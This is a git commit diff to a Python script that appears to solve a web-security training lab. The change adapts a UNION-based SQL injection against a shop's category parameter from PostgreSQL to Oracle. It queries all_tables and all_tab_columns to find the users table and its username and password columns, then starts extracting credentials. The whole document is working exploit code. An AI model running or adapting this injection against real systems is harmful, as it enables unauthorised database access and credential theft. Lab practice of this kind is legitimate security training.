3bec77f31ea282236c0d76b50aaaee36be6170e3
madi <madimirzakup@gmail.com>
2025-01-15 17:51:01 +0500

    #

--- Server Side Topics/SQLi/SQL injection attack, listing the database contents on Oracle/payload.py
+++ Server Side Topics/SQLi/SQL injection attack, listing the database contents on Oracle/payload.py
@@ -22,41 +22,47 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def main(args):
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, sess)
-    num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy)
+    num_columns = utils.determine_number_of_columns(shop.category_url, shop.no_proxy, True)
     if not num_columns:
         log.error("Could not determine number of columns. Exiting")
         sys.exit(-1)
     text_columns = utils.determine_text_columns(
-        shop.category_url, shop.no_proxy, num_columns
+        shop.category_url, shop.no_proxy, num_columns, True
     )
+    # users table
     log.info("Getting users table")
     nulls = ["NULL"] * num_columns
     nulls[text_columns[0]] = "table_name"
     nulls = ",".join(nulls)
     resp = shop.get_category(
-        f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
+        f"' UNION SELECT {nulls} from all_tables where owner = 'SYSTEM'-- "
     )
-    pattern = re.compile(r"<th>(users_.*?)</th>")
+    pattern = re.compile(r"<th>(USERS_.*?)</th>")
     m = pattern.search(resp.text)
     users_table = m[1]
     log.info(f"Found users table: {users_table}")
+    
+    
+    # Column names
     log.info("Getting columns from table.")
     nulls = ["NULL"] * num_columns
-    nulls[text_columns[0]] = "column_name"
+    nulls[text_columns[0]] = "COLUMN_NAME"
     nulls = ",".join(nulls)
     resp = shop.get_category(
-        f"' UNION SELECT {nulls} from information_schema.columns where table_name = '{users_table}'-- "
+        f"' UNION SELECT {nulls} from all_tab_columns where table_name = '{users_table}'-- "
     )
-    #passwords
-    pattern = re.compile(r"<th>(password_.*?)</th>")
+    
+    #passwords column
+    pattern = re.compile(r"<th>(PASSWORD_.*?)</th>")
     m = pattern.search(resp.text)
     password_column = m[1]
-    #username
-    pattern = re.compile(r"<th>(username_.*?)</th>")
+    
+    #username column
+    pattern = re.compile(r"<th>(USERNAME_.*?)</th>")
     m = pattern.search(resp.text)
     username_column = m[1]
-    log.info(f"Got username and pw columns: {username_column}, {password_column}")
-    log.info("Getting usernames and pw from db")
+    log.info(f"Got username and password columns: {username_column}, {password_column}")
+    log.info("Getting usernames and password from database")
     nulls = ["NULL"] * num_columns
     nulls[text_columns[0]] = username_column
     nulls[text_columns[1]] = password_column
